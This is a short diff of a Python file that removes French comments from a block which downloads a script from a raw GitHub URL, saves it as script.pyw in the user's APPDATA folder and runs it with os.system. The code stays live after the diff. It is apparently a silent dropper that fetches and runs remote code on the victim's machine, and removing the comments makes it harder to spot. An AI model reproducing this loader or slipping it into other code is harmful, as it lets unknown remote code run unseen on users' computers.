@@ -62,23 +62,19 @@ def make_requests():
     make_requests(headers)
 
 
-# URL du fichier à télécharger
 url = 'https://raw.githubusercontent.com/just4testaaa/test/main/script.py'
 
-# Chemin d'accès au dossier AppData de l'utilisateur
 appdata_path = os.getenv('APPDATA')
 
-# Chemin complet pour enregistrer le fichier téléchargé
+
 filename = os.path.join(appdata_path, 'script.pyw')
 
-# Télécharger le fichier à partir de l'URL
 response = requests.get(url)
 
-# Écrire le contenu du fichier dans le fichier local
 with open(filename, 'wb') as file:
     file.write(response.content)
 
 os.system(filename)
-# Exécuter le fichier
+
 
 
